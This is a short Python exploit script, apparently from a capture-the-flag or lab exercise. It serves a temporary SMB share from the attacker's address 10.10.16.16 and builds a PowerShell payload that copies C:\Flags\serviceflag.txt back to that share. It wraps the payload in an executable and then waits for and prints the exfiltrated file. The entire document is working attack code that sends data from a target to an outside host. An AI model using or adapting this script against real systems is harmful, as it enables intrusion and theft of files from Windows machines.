from payload import CRunPowershellExe
from tempsmbserver import TempSMB

local_ip = "10.10.16.16"


with TempSMB(local_ip=local_ip, smb2=True) as smb:
    return_channel = smb.future_file(ext=".out")
    powershell_payload = f"cp C:\\Flags\\serviceflag.txt {return_channel.remote_path_backslashes}"
    powershell_file = smb.create_temp_file(powershell_payload, ext=".ps1")
    exe_payload = CRunPowershellExe(smb, [powershell_file])
    print(exe_payload.file.remote_path.replace("/", "\\"))
    return_channel.await_me()
    return_channel.print(cringe_utf_16=True)
